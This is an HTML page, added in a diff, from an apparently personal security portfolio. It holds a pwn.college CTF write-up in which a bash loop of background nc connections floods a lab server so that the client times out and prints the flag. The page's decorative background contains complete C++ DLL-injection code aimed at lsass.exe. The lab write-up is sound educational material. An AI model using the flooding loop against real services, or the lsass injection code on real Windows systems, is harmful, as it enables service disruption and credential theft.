@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Denial-of-service-3 — Writeup</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Denial-of-service-3 — Writeup" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>Denial-of-service-3 — Writeup</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-overview">🧠 Challenge Overview</h2>
+
+<p>In this challenge, we are given a virtual network with three hosts:</p>
+
+<ul>
+  <li><strong>User Host</strong> (<code class="language-plaintext highlighter-rouge">10.0.0.1</code>): You</li>
+  <li><strong>Server Host</strong> (<code class="language-plaintext highlighter-rouge">10.0.0.2</code>): Listens on TCP port <code class="language-plaintext highlighter-rouge">31337</code></li>
+  <li><strong>Client Host</strong> (<code class="language-plaintext highlighter-rouge">10.0.0.3</code>): Tries to connect to the server and send <code class="language-plaintext highlighter-rouge">"Hello, World!\n"</code> once every second</li>
+</ul>
+
+<p>If the client <strong>fails to send</strong> the message (e.g., connection timeout), it <strong>prints the flag</strong>.</p>
+
+<hr />
+
+<h2 id="-goal">🎯 Goal</h2>
+
+<p><strong>Prevent the client from connecting</strong> to the server on port <code class="language-plaintext highlighter-rouge">31337</code>.<br />
+This is a classic <strong>Denial-of-Service (DoS)</strong> scenario. If the server is too busy (e.g., stuck handling our requests), it can’t serve the client — and the flag is revealed.</p>
+
+<hr />
+
+<h2 id="-server-logic-summary-from-challengerun">🔍 Server Logic Summary (from <code class="language-plaintext highlighter-rouge">/challenge/run</code>)</h2>
+
+<ul>
+  <li>Server listens on <code class="language-plaintext highlighter-rouge">0.0.0.0:31337</code>.</li>
+  <li>Each incoming connection is handled via <code class="language-plaintext highlighter-rouge">ForkingTCPServer</code>, which forks a new process.</li>
+  <li>Each handler waits up to <code class="language-plaintext highlighter-rouge">1s</code> for a message, then closes.</li>
+  <li>The client retries forever, but <strong>if it hits a <code class="language-plaintext highlighter-rouge">TimeoutError</code> or <code class="language-plaintext highlighter-rouge">socket.timeout</code></strong>, it prints the flag.</li>
+</ul>
+
+<hr />
+
+<h2 id="-exploit-strategy">💡 Exploit Strategy</h2>
+
+<p>We flood the server with <strong>many rapid short-lived connections</strong>, occupying its process slots, causing:</p>
+
+<ul>
+  <li><strong>Fork overload</strong>: server runs out of process slots</li>
+  <li><strong>Connection backlog saturation</strong></li>
+  <li><strong>Socket timeouts</strong> due to load</li>
+</ul>
+
+<p>We want to <em>flood the server</em> <strong>without crashing our shell</strong> by hitting the system fork limit.</p>
+
+<hr />
+
+<h2 id="-final-exploit">💣 Final Exploit</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
+  </span>nc <span class="nt">-w</span> 2 10.0.0.2 31337 &amp;
+  <span class="nb">sleep </span>0.000000001
+<span class="k">done</span>
+</code></pre></div></div>
+
+<ul>
+  <li>nc -w 2: sets a 2s timeout per connection</li>
+  <li>&amp;: runs in background</li>
+  <li>sleep 0.000000001: slight delay to avoid hitting:
+```
+-bash: fork: retry: Resource temporarily unavailable</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This script spawns many connections to overwhelm the server, while staying under the fork limit.
+
+### Sample Output
+
+</code></pre></div></div>
+<p>[12248] 50552
+[11737]   Exit 1  nc -w 2 10.0.0.2 31337
+…
+[12318]   Done    nc -w 2 10.0.0.2 31337
+root@ip-10-0-0-1:~#</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Eventually, the client fails to connect, and we get:
+</code></pre></div></div>
+<p>pwn.college{U55-2EAaxUiI_mD6vLgJNCPKwUC.0VO1AjNxwSM0IzMyEzW}</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+---
+
+## Final Flag
+</code></pre></div></div>
+<p>pwn.college{U55-2EAaxUiI_mD6vLgJNCPKwUC.0VO1AjNxwSM0IzMyEzW}
+```
+—</p>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
